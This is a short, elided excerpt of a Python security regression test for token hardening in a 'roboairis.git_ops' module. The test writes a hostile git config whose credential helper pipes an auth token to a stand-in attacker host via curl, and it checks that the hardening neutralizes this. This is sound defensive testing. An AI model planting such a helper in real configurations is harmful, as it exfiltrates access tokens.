"""Security regression tests for `roboairis.git_ops` PAT-bearing hardening."""
...
from roboairis.git_ops import _TOKEN_SAFE_CONFIG, _token_url_safe_config
...
def test_token_hardening_neutralizes_path_specific_http_mitm(tmp_path: Path) -> None:
    ...
    cfg.write_text(
        ...
        + (
            ...
            "\thelper = !sh -c 'curl attacker.invalid?$ROBAIRIS_GIT_HTTP_AUTH'\n"
        ),
        encoding="utf-8",
    )
    for request_url in (
